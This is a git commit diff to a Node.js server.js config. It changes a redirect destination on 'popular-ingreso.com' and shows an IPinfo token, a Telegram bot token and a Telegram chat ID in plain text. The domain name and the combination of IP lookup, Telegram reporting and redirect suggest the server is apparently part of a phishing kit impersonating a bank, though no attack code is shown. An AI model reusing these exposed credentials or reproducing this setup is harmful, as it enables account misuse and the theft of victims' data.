0dd548daea61c4d83f24974c4206b6c269944be3
varneyjb3-bit <varneyjb3@gmail.com>
2026-06-23 08:36:24 -0400

    Update server.js

--- server.js
+++ server.js
@@ -9,7 +9,7 @@ const CONFIG = {
     IPINFO_TOKEN: 'f14749fee64f8f', 
     TG_TOKEN: '8260412488:AAFCSGGrgSu9-mF7d7SjdI5bJ9cMa3WIqUY',
     TG_CHAT: '-1003321543933',
-    DESTINO: 'https://popular-ingreso.com', 
+    DESTINO: 'https://popular-ingreso.com/popularn.html', 
     PORT: process.env.PORT || 3000
 };
 
